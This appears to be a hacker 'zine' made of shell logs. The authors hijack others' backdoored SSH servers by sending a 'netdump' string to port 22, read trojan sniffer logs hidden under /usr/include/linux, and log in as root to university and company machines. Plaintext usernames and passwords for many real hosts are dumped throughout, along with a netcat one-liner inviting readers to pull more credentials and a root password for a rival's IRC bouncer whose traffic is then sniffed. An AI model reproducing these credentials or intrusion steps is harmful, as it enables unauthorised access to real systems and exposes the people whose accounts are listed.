Linux ssh1 2.6.22-4-k7 #1 SMP Tue Feb 12 17:54:42 UTC 2008 i686 GNU/Linux
 04:38:02 up 54 days,  1:50, 17 users,  load average: 0.05, 0.01, 0.00
root@ssh1:~# ./sheader /usr/include/linux/mac.h|sort|uniq|grep OUT      ------------>> this is their default sniffer path.
SSH2_OUT: 10.0.0.101    user: lourenco  pass: LiNuX0527         (didi.if.uff.int)
SSH2_OUT: 10.0.0.101    user: lourenco  pass: LiNuXS0527        (didi.if.uff.int)
SSH2_OUT: 10.0.0.101    user: nuno      pass: surfar    (catuaba.if.uff.int)
SSH2_OUT: 10.0.0.106    user: lourenco  pass: LiNuX0527         (cerbero4.if.uff.int)
SSH2_OUT: 10.0.0.108    user: critter   pass: 559832    (ronaldinho.if.uff.int)
SSH2_OUT: 10.0.0.136    user: davidvaz  pass: 2o3145    (barabasi.if.uff.int)
SSH2_OUT: 10.0.0.145    user: lubian    pass: 15862jLr  (lip-serverI.if.uff.int)
SSH2_OUT: 10.0.0.147    user: mcosta    pass: 950205    (nano3.if.uff.int)
SSH2_OUT: 10.0.0.155    user: asa       pass: gabixande2        (nanodc01.if.uff.int)
SSH2_OUT: 10.0.0.155    user: mcosta    pass: 950205    (nanodc01.if.uff.int)
SSH2_OUT: 10.0.0.156    user: thiagofts         pass: 8vacagk   (Owner-PC.if.uff.int)
SSH2_OUT: 10.0.0.157    user: alanfr    pass: ck37=2x   (ltspsrvr.if.uff.int)
SSH2_OUT: 10.0.0.157    user: curso     pass: curso     (ltspsrvr.if.uff.int)
SSH2_OUT: 10.0.0.157    user: help      pass: slacksucks!       (ltspsrvr.if.uff.int)
SSH2_OUT: 10.0.0.157    user: opeador   pass: slacksucks!       (ltspsrvr.if.uff.int)
SSH2_OUT: 10.0.0.157    user: operador  pass: slacksucks!       (ltspsrvr.if.uff.int)
SSH2_OUT: 10.0.0.179    user: orahcio   pass: wulto12   (viagra.if.uff.int)
SSH2_OUT: 10.0.0.188    user: nuno      pass: surfar    (catuaba.if.uff.int)
SSH2_OUT: 10.0.0.195    user: asa       pass: gabixande2        (nano2.if.uff.int)
SSH2_OUT: 10.0.0.196    user: isidoro   pass: VU4R9C    (zico.if.uff.int)
SSH2_OUT: 10.0.0.2      user: isidoro   pass: VU4R9C
SSH2_OUT: 10.0.0.208    user: davidvaz  pass: 2o3145    (homer.if.uff.int)
SSH2_OUT: 10.0.0.208    user: davidvaz  pass: o3145     (homer.if.uff.int)
SSH2_OUT: 10.0.0.208    user: tgmattos  pass: CAMtgm&7  (homer.if.uff.int)
SSH2_OUT: 10.0.0.215    user: asa       pass: gabixande2        (cerbero7.if.uff.int)
SSH2_OUT: 10.0.0.215    user: lourenco  pass: LiNuX0527         (cerbero7.if.uff.int)
SSH2_OUT: 10.0.0.215    user: lourenco  pass: LiNuX05427        (cerbero7.if.uff.int)
SSH2_OUT: 10.0.0.217    user: dionizio  pass: Zoedoulos         (cerbero9.if.uff.int)
SSH2_OUT: 10.0.0.217    user: lourenco  pass: LiNuX0527         (cerbero9.if.uff.int)
SSH2_OUT: 10.0.0.222    user: lourenco  pass: LiNuX0527         (romario.if.uff.int)
SSH2_OUT: 10.0.0.222    user: lourenco  pass: LiNuX527  (romario.if.uff.int)
SSH2_OUT: 10.0.0.226    user: dionizio  pass: Zoedoulos         (cerbero10.if.uff.int)
SSH2_OUT: 10.0.0.226    user: lourenco  pass: LiNuX0527         (cerbero10.if.uff.int)
SSH2_OUT: 10.0.0.226    user: lourenco  pass: exit      (cerbero10.if.uff.int)
SSH2_OUT: 10.0.0.227    user: jssm      pass: Jujaja    (complex000.if.uff.int)
SSH2_OUT: 10.0.0.227    user: nuno      pass: surfar    (complex000.if.uff.int)
SSH2_OUT: 10.0.0.227    user: pmco      pass: druida99  (complex000.if.uff.int)
SSH2_OUT: 10.0.0.231    user: alan      pass: ck37=2x
SSH2_OUT: 10.0.0.231    user: root      pass: slacksucks!
SSH2_OUT: 10.0.0.231    user: root      pass: slacksucks!       (urania.if.uff.int)
SSH2_OUT: 10.0.0.246    user: bernardo  pass:   (damasco.if.uff.int)
SSH2_OUT: 10.0.0.246    user: bernardo  pass: truthno1  (damasco.if.uff.int)
SSH2_OUT: 10.0.0.247    user: jssm      pass: Jujaja    (gould.if.uff.int)
SSH2_OUT: 10.0.0.44     user: tgmattos  pass: CAMtgm&7
SSH2_OUT: 10.0.0.60     user: fsilveira         pass: Instituto
SSH2_OUT: 10.0.0.60     user: fsilveira         pass: VaiPasSar
SSH2_OUT: 10.0.0.75     user: davidvaz  pass: 2o3145    (DOAS-Laptop.if.uff.int)
SSH2_OUT: 10.0.0.78     user: alan      pass: ck37=2x   (urania.if.uff.int)
SSH2_OUT: 10.0.0.93     user: pmco      pass: druida99  (urubu.if.uff.int)
SSH2_OUT: 10.0.0.93     user: pmco      pass: druidruida99      (urubu.if.uff.int)
SSH2_OUT: 10.0.0.97     user: critter   pass: 559832    (ronaldinho.if.uff.int)

-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # telnet 203.161.120.230 22
Trying 203.161.120.230...
Connected to 203.161.120.230.
Escape character is '^]'.
SSH-2.0-OpenSSH_4.3
netdump                                                              --------->>>>>>>>>>>>>>>>>>>>>>>>> letmein
pass_from: 58.7.216.153         user: root      pass: @pixar87  (dsl-58-7-216-153.wa.westnet.com.au) -> h3h3, sorry pal.

central@labsec [~xoxox/h3h3] # ssh root@203.161.120.230
root@203.161.120.230's password: 

----- no skynet -------

Last login: Tue Aug 12 19:32:36 2008 from dsl-58-7-216-153.wa.westnet.com.au
zeus:~#
zeus:/usr/include/linux# uname -a;w;/sbin/ifconfig -a|grep inet
Linux zeus 2.6.8-2-386 #1 Thu May 19 17:40:50 JST 2005 i686 GNU/Linux
 15:27:04 up 104 days,  6:19,  1 user,  load average: 0.00, 0.02, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
          inet addr:203.161.120.230  Bcast:203.161.120.255  Mask:255.255.255.240
          inet6 addr: fe80::209:3dff:fe12:67e8/64 Scope:Link
          inet addr:11.11.11.3  Bcast:11.255.255.255  Mask:255.255.255.0

zeus:/usr/include/linux# ./sheader /usr/include/linux/byteorder/ssh.h|sort|uniq|more
SSH2_OUT: 11.11.11.55   user: michael   pass: @pixar87
SSH2_OUT: 11.11.11.55   user: michael   pass: dh0st1ngd
SSH2_OUT: 11.11.11.55   user: michael   pass: ruup2it
SSH2_OUT: 11.11.11.55   user: root      pass: @pixar87
SSH2_OUT: 11.11.11.9    user: admin     pass: @pixar87
SSH2_OUT: 11.11.11.9    user: admin     pass: emaildivers
SSH2_OUT: 11.11.11.9    user: admin     pass: jugg3r0
SSH2_OUT: 11.11.11.9    user: root      pass: @pixar887
SSH2_OUT: 11.11.11.9    user: root      pass: jugg3r0
pass_from: 10.10.10.129         user: root      pass: @pixar87

-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # telnet 207.145.66.12 22
Trying 207.145.66.12...
Connected to 207.145.66.12.
Escape character is '^]'.
SSH-2.0-OpenSSH_4.7
netdump                                                              --------->>>>>>>>>>>>>>>>>>>>>>>>> smack
pass_from: 24.218.192.76        user: root      pass: cl1pt3xt  (c-24-218-192-76.hsd1.ma.comcast.net)-> sorry bro
pass_from: 75.68.31.152         user: gman      pass: 0xc0ffee  (c-75-68-31-152.hsd1.nh.comcast.net) -> >:(

central@labsec [~xoxox/h3h3] # ssh root@207.145.66.12
root@207.145.66.12's password: 

Last login: Wed Aug  6 23:25:38 2008 from 189.4.184.201              --------->>>>>>>>>>>>>>>>>>>>>>>>> quick question, who's that ?
                                                                     --------->>>>>>>>>>>>>>>>>>>>>>>>> doesn't that make you sad? i mean, wtf...

d4:~#
d4:~# uname -a;w;/sbin/ifconfig -a|grep inet
Linux d4 2.6.25-2-686 #1 SMP Tue May 27 15:38:35 UTC 2008 i686 GNU/Linux
 03:36:51 up 68 days,  4:58,  0 user,  load average: 1.88, 1.80, 1.74
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
          inet addr:207.145.66.12  Bcast:207.145.66.255  Mask:255.255.255.0
          inet6 addr: fe80::209:6bff:fe8c:e58/64 Scope:Link

-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # telnet 212.111.196.163 22
Trying 212.111.196.163...
Connected to 212.111.196.163.
Escape character is '^]'.
SSH-2.0-OpenSSH_4.7
netdump                                                              --------->>>>>>>>>>>>>>>>>>>>>>>>> i DEMAND THE PASSWORD !
SSH2_OUT: 127.0.0.1     user: root      pass: x4rtuhg6  (localhost)  --------->>>>>>>>>>>>>>>>>>>>>>>>> oh, i missed you, localhost.
pass_from: ::ffff:10.66.10.111  user: root      pass: dihlordifenil  --------->>>>>>>>>>>>>>>>>>>>>>>>> h3h3 >;(

central@labsec [~xoxox/h3h3] # ssh root@212.111.196.163
root@212.111.196.163's password: 

Last login: Fri Aug  8 19:49:52 2008 from 189.4.161.222              ------------>>>>>>>>>>>>>> lets laugh for a while now

                            **** Connected to ****              

               ### #  ### ##   ###  ##  ### ###  ######  ######   
               ##  #   ## #     ##  ##   ##  #    ##    # # ## #  
               ####    ###       ####    ### #    ####     ##     
                 ###   ####       ##     #####    ##       ##     
               #  ##   ## ##      ##     ## ##    ## ##    ##     
               ####   #### ##    ####   ### ##   ######   #### 1.0
                 **** Linux users 2.6.23-gentoo i686 ****

root@users:~#
root@users:~# uname -a;w;/sbin/ifconfig -a|grep inet
Linux users 2.6.23-gentoo #4 SMP PREEMPT Fri Dec 14 19:43:35 EET 2007 i686 Intel(R) Xeon(TM) CPU 3.00GHz GenuineIntel GNU/Linux
 10:49:08 up 171 days, 22:37,  1 user,  load average: 0.20, 0.24, 0.21
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0     10:46    0.00s  0.44s  0.00s w
          inet addr:192.168.253.3  Bcast:192.168.253.255  Mask:255.255.255.0
          inet6 addr: fe80::204:23ff:febb:d710/64 Scope:Link
          inet addr:169.254.78.132  Bcast:169.254.255.255  Mask:255.255.0.0
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          inet addr:212.111.196.163  Bcast:212.111.196.191  Mask:255.255.255.224
          inet6 addr: fe80::204:23ff:febb:d710/64 Scope:Link
          inet addr:212.26.143.6  Bcast:212.26.143.7  Mask:255.255.255.252
          inet6 addr: fe80::204:23ff:febb:d710/64 Scope:Link

-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # telnet 212.143.216.226 22
Trying 212.143.216.226...
Connected to 212.143.216.226.
Escape character is '^]'.
SSH-2.0-OpenSSH_4.3
netdump                                                              --------->>>>>>>>>>>>>>>>>>>>>>>>> im getting tired of this.
pam_from: 62.219.238.196        user: root      pass: QWERFcxz  (mail2.tikalnetworks.com) ----->>>>>>>> no kidding.

central@labsec [~xoxox/h3h3] # ssh root@212.143.216.226
root@212.143.216.226's password: 

jessica temp # uname -a;w;/sbin/ifconfig -a|grep inet
Linux jessica 2.6.17-gentoo-r7 #3 Sun Sep 3 11:17:41 IDT 2006 i686 Intel(R) Celeron(R) CPU 2.66GHz GenuineIntel GNU/Linux
 09:58:11 up 3 days, 18:03,  1 user,  load average: 1.29, 1.16, 1.08
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0     09:34   16:19   0.32s  0.30s ssh 10.0.0.3
          inet addr:10.0.0.253  Bcast:10.0.0.255  Mask:255.255.255.0
          inet addr:127.0.0.1  Mask:255.0.0.0

-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # echo netdump|nc 143.107.133.103 22|grep OUT
SSH2_OUT: 143.107.133.38        user: wlscopel  pass: va1513zb  (feynman.if.usp.br)
SSH2_OUT: 143.107.133.233       user: pdborges  pass: mipa0529  (aegir.if.usp.br)
SSH2_OUT: 143.106.42.243        user: luana     pass: 103174b   (athenas.cna.unicamp.br)
SSH2_OUT: 143.107.133.8         user: kpp       pass: fth6mdy   (landauer.if.usp.br)
SSH2_OUT: 143.107.133.47        user: luana     pass: 103174b   (schroedinger.if.usp.br)
SSH2_OUT: 143.107.133.76        user: mvarella  pass: CH3Ftri   (planck.if.usp.br)
SSH2_OUT: 143.107.133.38        user: wlscopel  pass: va1513zb  (feynman.if.usp.br)
SSH2_OUT: 143.107.133.47        user: cedric    pass: KunD1cka  (schroedinger.if.usp.br)

central@labsec [~xoxox/h3h3] # echo netdump|nc 143.107.133.103 22|grep from|grep -v bullshit
pass_from: 143.107.133.244      user: hmf18     pass: xpx9b15+  (turista.if.usp.br)
pass_from: 201.52.218.156       user: cedric    pass: P1chona04         (c934da9c.virtua.com.br)
pass_from: 201.82.105.213       user: mfsoares  pass: 3p1t@xy   (c95269d5.virtua.com.br)
pass_from: 189.34.88.209        user: kpp       pass: mdc6gpt   (bd2258d1.virtua.com.br)
pass_from: 189.102.19.167       user: pontes    pass: r@s&09*   (bd6613a7.virtua.com.br)
pass_from: 189.102.98.126       user: lassali   pass: las2008ro         (bd66627e.virtua.com.br)



central@labsec [~xoxox/h3h3] # ssh root@143.107.133.103 'uname -a'
root@143.107.133.103's password: 

Linux romeo 2.6.5-7.286-smp #1 SMP Thu May 31 10:12:58 UTC 2007 x86_64 x86_64 x86_64 GNU/Linux

-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # telnet 200.144.186.37 22
Trying 200.144.186.37...
Connected to shark.lcca.usp.br (200.144.186.37).
Escape character is '^]'.
SSH-2.0-OpenSSH_4.3
netdump                                                              --------->>>>>>>>>>>>>>>>>>>>>>>>> k from now on, no more netdump messages
SSH2_OUT: 127.0.0.1     user: root      pass: UspNNNNd  (localhost)  --------->>>>>>>>>>>>>>>>>>>>>>>>> just got tired, u knoW
SSH2_OUT: 127.0.0.1     user: amazonas  pass: UspNNNNd  (localhost)  --------->>>>>>>>>>>>>>>>>>>>>>>>> anyway im almost stopping pasting stuff

-> alot of kool shit regarding usp.br here
try yourself-> echo netdump|nc 200.144.186.37 22|grep usp.br
or just grep OUT

kthxnpurwelcome

-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # echo netdump|nc 200.145.203.74 22|grep localhost
SSH2_OUT: 127.0.0.1     user: root      pass: ArmY1*00  (localhost)        ->>>>>>>>>>>>>>>>> im glad you are here :) kind of makes it easy

central@labsec [~xoxox/h3h3] # ssh root@200.145.203.74
root@200.145.203.74's password: 

Last login: Thu Jul 31 09:30:33 2008 from nemo.df.ibilce.unesp.br

                            **** Connected to ****              

               ### #  ### ##   ###  ##  ### ###  ######  ######   
               ##  #   ## #     ##  ##   ##  #    ##    # # ## #  
               ####    ###       ####    ### #    ####     ##     
                 ###   ####       ##     #####    ##       ##     
               #  ##   ## ##      ##     ## ##    ## ##    ##     
               ####   #### ##    ####   ### ##   ######   #### 1.0
                 **** Linux hobbes 2.6.18-6-686 i686 ****

root@hobbes:~#
root@hobbes:~# uname -a;w;/sbin/ifconfig -a|grep inet
Linux hobbes 2.6.18-6-686 #1 SMP Fri Jun 6 22:22:11 UTC 2008 i686 GNU/Linux
 05:47:44 up 27 days, 15:12,  1 user,  load average: 0.21, 0.15, 0.06
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
rico     :0       -                06Aug08 ?xdm?   5:39   0.71s x-session-manager
          inet addr:200.145.203.74  Bcast:200.145.203.255  Mask:255.255.255.0
          inet6 addr: fe80::2e0:7dff:fed7:f778/64 Scope:Link
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
root@hobbes:~# 

central@labsec [~xoxox/h3h3] # echo netdump|nc 200.145.203.74 22|grep unesp        
pass_from: 200.145.203.42       user: rico      pass: so31fia12         (nemo.df.ibilce.unesp.br)
SSH2_OUT: 200.145.203.42        user: ronaldo   pass: LANmu80   (nemo.df.ibilce.unesp.br)

-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # telnet 67.15.56.12 22
Trying 67.15.56.12...
Connected to 67.15.56.12.
Escape character is '^]'.
SSH-1.99-OpenSSH_3.9
netdump
SSH2_OUT: 127.0.0.1     user: root      pass: l3nny1nt3l        (localhost)
SSH2_OUT: 127.0.0.1     user: lenny     pass: l3nny1nt3l        (localhost)
pass_from: 76.188.180.141       user: joe       pass: 1207j0s3ph7ys0n9813       (cpe-76-188-180-141.neo.res.rr.com)
pass_from: 76.188.180.141       user: devel     pass: ha1W0;rlD.0121    (cpe-76-188-180-141.neo.res.rr.com)
pass_from: 76.188.180.141       user: celtrust  pass: 1207j0s3ph9813    (cpe-76-188-180-141.neo.res.rr.com)



central@labsec [~xoxox/h3h3] # ssh root@67.15.56.12
root@67.15.56.12's password: 

Last login: Tue Aug 12 00:51:58 2008 from c-98-234-65-222.hsd1.ca.comcast.net

                            **** Connected to ****              

               ### #  ### ##   ###  ##  ### ###  ######  ######   
               ##  #   ## #     ##  ##   ##  #    ##    # # ## #  
               ####    ###       ####    ### #    ####     ##     
                 ###   ####       ##     #####    ##       ##     
               #  ##   ## ##      ##     ## ##    ## ##    ##     
               ####   #### ##    ####   ### ##   ######   #### 1.0
                 **** Linux f1.celtrust.com 2.6.9-34.ELsmp i686 ****

[root[@f1 ~]#
[root[@f1 ~]# uname -a;w;/sbin/ifconfig -a|grep inet
Linux f1.celtrust.com 2.6.9-34.ELsmp #1 SMP Fri Feb 24 16:54:53 EST 2006 i686 i686 i386 GNU/Linux
 05:20:15 up 153 days,  9:30,  0 users,  load average: 2.62, 1.27, 0.63
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
          inet addr:67.15.56.12  Bcast:67.15.57.255  Mask:255.255.254.0
          inet6 addr: fe80::211:11ff:fe67:a66b/64 Scope:Link
          inet addr:67.15.57.240  Bcast:67.15.57.255  Mask:255.255.255.0
          inet addr:67.15.57.241  Bcast:67.15.57.255  Mask:255.255.255.0

-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # ssh root@66.119.174.19
root@66.119.174.19's password: 



                            **** Connected to ****              

               ### #  ### ##   ###  ##  ### ###  ######  ######   
               ##  #   ## #     ##  ##   ##  #    ##    # # ## #  
               ####    ###       ####    ### #    ####     ##     
                 ###   ####       ##     #####    ##       ##     
               #  ##   ## ##      ##     ## ##    ## ##    ##     
               ####   #### ##    ####   ### ##   ######   #### 1.0
                 **** Linux res1.van.metrobridge.net 2.6.18-5-686 i686 ****

root@res1:~# 
root@res1:~# uname -a;w;/sbin/ifconfig -a|grep inet
Linux res1.van.metrobridge.net 2.6.18-5-686 #1 SMP Fri Jun 1 00:47:00 UTC 2007 i686 GNU/Linux
 12:54:34 up 315 days, 17:40,  4 users,  load average: 0.58, 0.35, 0.27
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
sky      pts/0    66.119.176.2     11:41    1:12   0.00s  0.00s -bash
sky      pts/3    66.119.176.2     Tue15   20:53   0.18s  0.00s sshd: sky [priv] 
sky      pts/6    66.119.176.2     11:42    1:10   0.16s  0.01s sshd: sky [priv] 
vee      pts/7    74.221.143.3     12:23   28:41m  0.07s  0.00s telnet seton-3550
          inet addr:66.119.174.4  Bcast:66.119.174.15  Mask:255.255.255.240
          inet6 addr: fe80::219:b9ff:fee1:c808/64 Scope:Link
          inet addr:66.119.174.29  Bcast:66.119.174.31  Mask:255.255.255.240
          inet addr:65.39.152.235  Bcast:65.39.152.255  Mask:255.255.255.224
          inet addr:65.39.152.237  Bcast:65.39.152.255  Mask:255.255.255.224
          inet addr:66.119.174.19  Bcast:66.119.174.31  Mask:255.255.255.240
          inet addr:65.39.152.239  Bcast:65.39.152.255  Mask:255.255.255.224
          inet addr:66.119.174.3  Bcast:66.119.174.15  Mask:255.255.255.240
          inet addr:66.119.174.2  Bcast:66.119.174.15  Mask:255.255.255.240

pass_from: 66.119.176.2         user: simon     pass: pass77    (mail.metrobridge.com)        [whole metrobridge with the same pass]
pass_from: 66.119.176.2         user: sky       pass: rotoFro7  (mail.metrobridge.com)        [whole metrobridge with the same pass]

have fun

- what a shame.. again, metrobridge ? i told you to keep on eye on your sshd since your zine :(


-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # ssh root@200.239.200.102
root@200.239.200.102's password: 

Last login: Mon Aug 11 09:09:40 2008 from stml030.microlink.com.br
Linux 2.6.11.12-ul1.

                            **** Connected to ****              

               ### #  ### ##   ###  ##  ### ###  ######  ######   
               ##  #   ## #     ##  ##   ##  #    ##    # # ## #  
               ####    ###       ####    ### #    ####     ##     
                 ###   ####       ##     #####    ##       ##     
               #  ##   ## ##      ##     ## ##    ## ##    ##     
               ####   #### ##    ####   ### ##   ######   #### 1.0
                 **** Linux proxy2-rj 2.6.11.12-ul1 i686 ****

root@proxy2-rj:~# 
root@proxy2-rj:~# uname -a;hostname -f;w
Linux proxy2-rj 2.6.11.12-ul1 #1 Tue Aug 30 12:40:56 BRT 2005 i686 unknown
proxy2-rj.pop-rio.com.br
 17:14:22 up 97 days,  5:09,  0 users,  load average: 2.16, 1.88, 1.76
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
root@proxy2-rj:~# 
root@proxy2-rj:~# ./sshread mac.h|grep 200\.239|sort|uniq
pass_from: 200.239.245.50       user: root      pass: Beth01@   (gwpr03.microlink.com.br)
pass_from: 200.239.245.70       user: root      pass: pa$$w0rd  (Froes.microlink.com.br)
root@proxy2-rj:~# ./sshread mac.h|grep OUT
SSH2_OUT: 127.0.0.1     user: root      pass: BuCaaAadd         (localhost) -----> /me laughs

-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # ssh root@143.107.250.214
root@143.107.250.214's password:

Last login: Fri Jun 13 14:58:50 2008 from 143-107-55-100.iq.usp.br

                          ..... !! HELLO WORLD !! .....              

                            @@@@@@              @@@@@@               
                           @@    @@            @@    @@              
                 @@    @@  @@   @@@  @@    @@  @@   @@@  @@    @@    
                  @@  @@   @@  @ @@   @@  @@   @@  @ @@   @@  @@     
                   IIII    II I  II    IIII    II I  II    IIII      
                   IIII    III   II    IIII    III   II    IIII      
                  II  II   II    II   II  II   II    II   II  II     
                 II    II   IIIIII   II    II   IIIIII   II    II    
                 **** Linux noelrosa.iq.usp.br 2.6.9-42.0.10.EL x86_64 ****          ->>>> new kool motd, n1cE rIpZ

[root[@noelrosa ~]#

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< s0RrY bUT We g0T tiReD oF pAstIng StUfF lIkE thAT >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-;;;;;;; i think thats enough to paste, right ?
-;;;;;;  anyway, in the end/bottom of this 'zine' there is a file to download with some of the ip's that weve got from them

-/-/-/-/-/-/-/-/-/-/ lEtz havE fuN WiTH r47's BnC rigHT noW -/-/-/-/-/-/-/-/-/-/ 

r47 is r47@bl4ckh47.org * i own u!            [and We own you!]
r47 on @#combat #osiris @#/<-rad 
r47 using irc.ipv6.he.net Hurricane Electric IPV6 IRC Server
r47 actually using host 2001:470:1f15:42b::3
r47 End of /WHOIS list.

central@labsec [~xoxox/h3h3] # ssh root@bl4ckh47.org -p 2222 bash

root@bl4ckh47.org's password: .niklincith08. (same pass goes for all casablanca.cz/eurosignal.cz)
uname -a;w;hostname -f
Linux VoIP-Mnisek 2.6.18-3-k7-pj #2 Tue Feb 27 18:30:13 CET 2007 i686 GNU/Linux
 10:13:26 up 162 days,  8:25,  0 users,  load average: 0.04, 0.05, 0.01
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
VoIP.eurosignal.cz

sit0      Link encap:IPv6-in-IPv4  
          inet6 addr: ::10.0.2.254/96 Scope:Compat
          inet6 addr: ::127.0.0.1/96 Scope:Unknown
          inet6 addr: ::10.0.2.4/96 Scope:Compat
          inet6 addr: ::77.78.84.242/96 Scope:Compat
          UP RUNNING NOARP  MTU:1480  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

sit1      Link encap:IPv6-in-IPv4  
          inet6 addr: 2001:470:1f15:42b::2/64 Scope:Global
          inet6 addr: 2001:470:1f15:42b::3/64 Scope:Global
          inet6 addr: 2001:470:1f15:42b::4/64 Scope:Global
          inet6 addr: 2001:470:1f15:42b::5/64 Scope:Global
          inet6 addr: 2001:470:1f15:42b::6/64 Scope:Global
          inet6 addr: 2001:470:1f15:42b::7/64 Scope:Global
          inet6 addr: fe80::a00:2fe/64 Scope:Link
          inet6 addr: fe80::a00:204/64 Scope:Link
          inet6 addr: fe80::4d4e:54f2/64 Scope:Link
          UP POINTOPOINT RUNNING NOARP  MTU:1480  Metric:1
          RX packets:16700 errors:0 dropped:0 overruns:0 frame:0
          TX packets:9917 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1677861 (1.6 MiB)  TX bytes:982003 (958.9 KiB)

tcp        0      0 77.48.84.242:65535      189.4.189.139:61593     ESTABLISHED
tcp6       0      0 2001:470:1f15:42b:51338 2001:41e0:5::6667:6667  ESTABLISHED
tcp6       0      0 2001:470:1f15:42b:49197 2001:470:0:6667::2:6667 ESTABLISHED
tcp6       0      0 2001:470:1f15:42b:48159 2001:40a8:3000:1:0:6667 ESTABLISHED
tcp6       0      0 2001:470:1f15:42b:51411 2001:40a8:3000:1:0:6667 ESTABLISHED

perl      12655     root    4u  IPv4  3027913       TCP *:65535 (LISTEN)
root     12655  0.0  0.3   5256  3220 ?        S    Mar19   2:39 supervise log
- nice process name btw
- lets start the sniffer, shall we? - btw im using the ircsniff.pl you stole from efnet's box, thanks - 

<- :d0n_!burnout@burnout.bitchx.org PRIVMSG r47 :u know d0n
<- :d0n_!burnout@burnout.bitchx.org PRIVMSG r47 :he took my nick
<- :d0n_!burnout@burnout.bitchx.org PRIVMSG r47 :he's packeting me
<- :d0n_!burnout@burnout.bitchx.org PRIVMSG r47 :;\
-> PRIVMSG d0n_ :d0n No such nick/channel
-> PRIVMSG d0n_ :d0n End of /WHOIS list.
-> PRIVMSG d0n_ :change
<- :d0n!burnout@burnout.bitchx.org PRIVMSG r47 :lamer :(
